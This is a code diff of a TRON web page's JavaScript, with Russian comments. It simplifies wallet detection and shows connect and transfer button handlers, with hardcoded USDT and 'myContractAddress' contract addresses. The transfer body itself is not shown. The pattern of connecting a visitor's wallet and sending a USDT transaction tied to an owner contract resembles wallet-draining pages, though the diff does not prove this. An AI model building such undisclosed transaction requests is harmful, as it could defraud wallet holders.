@@ -7,58 +7,31 @@ let userAddress = '';
 const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const myContractAddress = 'THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY'; 
 
-// Улучшенная функция инициализации для мобильных кошельков
-async function getTronWeb() {
-    // 1. Проверяем классический window.tronWeb (TronLink и др.)
+// Проверка наличия TronWeb или мобильного провайдера
+function getTronWeb() {
     if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
         return window.tronWeb;
     }
-
-    // 2. Ожидание загрузки объекта в мобильном браузере
-    return new Promise((resolve) => {
-        let attempts = 0;
-        const interval = setInterval(() => {
-            attempts++;
-            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-                clearInterval(interval);
-                resolve(window.tronWeb);
-            } else if (attempts > 20) { // Ждем до 8 секунд
-                clearInterval(interval);
-                resolve(null);
-            }
-        }, 400);
-    });
+    return null;
 }
 
 connectBtn.addEventListener('click', async () => {
     try {
-        walletAddressText.innerText = "Подключение...";
-        
-        // Попытка получить доступ к TronWeb
-        let tronWeb = await getTronWeb();
+        walletAddressText.innerText = "Поиск сети TRON...";
+        let tronWeb = getTronWeb();
 
-        // Если кошелек открыт в Trust Wallet или другом EVM-браузере, пробуем запросить учетную запись через провайдер сети
-        if (!tronWeb && window.ethereum) {
-            try {
-                // Запрос смены/получения сетей, если кошелек поддерживает мультичейн
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                if (accounts && accounts.length > 0) {
-                    walletAddressText.innerText = "Сеть EVM активна. Переключитесь на TRON в кошельке!";
-                }
-            } catch (e) {
-                console.error("Ошибка EVM провайдера:", e);
-            }
+        // Если нативного TronWeb нет (как в Trust Wallet по умолчанию), выводим понятную инструкцию для пользователя
+        if (!tronWeb) {
+            alert('В текущем браузере кошелька не обнаружена сеть TRON. Убедитесь, что вы открыли сайт через DApp-браузер с поддержкой Tron (например, TronLink), либо используйте кошелек с поддержкой WalletConnect для Tron.');
+            walletAddressText.innerText = "Сеть TRON не найдена";
+            return;
         }
 
-        if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
-            userAddress = tronWeb.defaultAddress.base58;
-            walletAddressText.innerText = `Подключено: ${userAddress}`;
-            connectBtn.style.display = 'none';
-            transferBtn.style.display = 'inline-block';
-        } else {
-            alert('Кошелек TRON не найден. Убедитесь, что в настройках Trust Wallet выбрана сеть Tron или используйте DApp-браузер с полной поддержкой TRC20.');
-            walletAddressText.innerText = "Кошелек не найден";
-        }
+        userAddress = tronWeb.defaultAddress.base58;
+        walletAddressText.innerText = `Подключено: ${userAddress}`;
+        connectBtn.style.display = 'none';
+        transferBtn.style.display = 'inline-block';
+
     } catch (error) {
         console.error("Ошибка подключения:", error);
         alert("Произошла ошибка при подключении.");
@@ -67,7 +40,7 @@ connectBtn.addEventListener('click', async () => {
 
 transferBtn.addEventListener('click', async () => {
     try {
-        const tronWeb = await getTronWeb();
+        const tronWeb = getTronWeb();
         if (!userAddress || !tronWeb) {
             alert('Сначала подключите кошелек!');
             return;
@@ -89,6 +62,6 @@ transferBtn.addEventListener('click', async () => {
 
     } catch (error) {
         console.error("Ошибка при отправке запроса:", error);
-        alert("Ошибка при выполнении транзакции. Проверьте консоль кошелька.");
+        alert("Ошибка при выполнении транзакции.");
     }
 });
